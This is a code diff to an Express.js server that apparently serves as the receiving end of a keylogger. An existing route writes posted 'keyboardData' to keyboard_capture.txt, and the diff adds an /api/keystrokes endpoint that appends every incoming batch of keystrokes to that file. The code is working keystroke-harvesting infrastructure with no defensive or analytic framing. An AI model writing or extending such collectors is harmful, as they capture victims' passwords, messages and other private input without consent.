@@ -37,6 +37,19 @@ app.post("/", (req, res) => {
     fs.writeFileSync("keyboard_capture.txt", req.body.keyboardData);
     res.send("Successfully set the data");
 });
+
+// Add a new POST endpoint for /api/keystrokes
+app.post("/api/keystrokes", (req, res) => {
+    try {
+        // Append the keyboard data to the file instead of overwriting
+        fs.appendFileSync("keyboard_capture.txt", req.body.keyboardData + "\n");
+        res.status(200).send("Keystrokes logged successfully.");
+    } catch (error) {
+        console.error("Error logging keystrokes:", error);
+        res.status(500).send("Failed to log keystrokes.");
+    }
+});
+
 // We can see that the app is listening on which port.
 app.listen(port, () => {
     console.log(`App is listening on port ${port}`);
